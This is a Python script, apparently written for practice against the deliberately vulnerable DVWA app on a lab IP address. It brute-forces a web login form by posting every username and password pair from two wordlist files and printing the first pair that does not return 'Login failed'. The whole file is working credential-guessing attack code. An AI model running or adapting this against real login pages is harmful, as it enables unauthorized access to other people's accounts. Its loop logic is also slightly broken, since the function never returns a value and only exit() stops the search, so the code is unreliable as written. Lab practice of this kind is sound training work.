#!/usr/bin/python3

import requests

def bruteforce(username, password, url):
    print("[+] Trying to Bruteforce with username:", username, "and password:", password)
        
    data_dictinary = {"username": username, "password": password, "Login": "submit"}
        
    response = requests.post(url, data=data_dictinary)
        
    if "Login failed" in response.content.decode("utf-8"):
            pass
    else:
          print("[+] Username --->>", username)
          print("[+] password ---->>", password)
          exit()
            
page_url = "http://10.0.2.4/dvwa/login.php"
usernames_file_path = "usernames.txt"
passwords_file_path = "passwords.txt"

with open(usernames_file_path, "r", encoding="utf-8") as usernames_file:
    usernames = usernames_file.readlines()

with open(passwords_file_path, "r", encoding="utf-8") as passwords_file:
    passwords = passwords_file.readlines()

for username in usernames:
    username = username.strip()
    for password in passwords:
        password = password.strip()
        if bruteforce(username, password, page_url):
            break
    else:
        continue
    break
else:
    print("[-] Username and Password not found in the list!")
